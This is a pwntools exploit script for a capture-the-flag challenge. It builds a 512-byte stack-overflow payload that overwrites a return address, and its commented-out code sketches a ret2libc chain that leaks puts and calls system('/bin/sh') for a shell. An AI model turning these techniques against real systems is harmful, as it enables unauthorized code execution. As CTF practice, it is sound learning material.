from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./all_patched')
libc = ELF('./libc-2.31.so')
context.binary = elf
p = elf.process()
# p = remote('challs.n00bzunit3d.xyz', 42450)

offset = 512

# rop = ROP(elf)
# # rop.call(elf.symbols['stdout'], [elf.got['write']])
# rop.call(elf.symbols['main'])

# payload = [
#     b'A' * offset,
#     rop.chain()
# ]
# payload = b''.join(payload)


payload = b"A"*offset + p64(0x00004011a9)

print(payload)
# p.recvuntil('> ')
# gdb.attach(p)

# p.sendline(payload)


# leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# print(f'puts: {hex(leak)}')

# libc.address = leak - libc.symbols['puts']

# rop = ROP(libc)
# # rop.call('puts', [next(libc.search(b'/bin/sh\x00'))])
# rop.call('system', [next(libc.search(b'/bin/sh\x00'))])


# payload = [
#     b'A' * offset,
#     p64(0x000000000040101a), #ret
#     rop.chain()
# ]

# payload = b''.join(payload)
# print(payload)
# print(len(payload))

# p.recv()
# p.sendline(payload)
# p.recv()

p.interactive()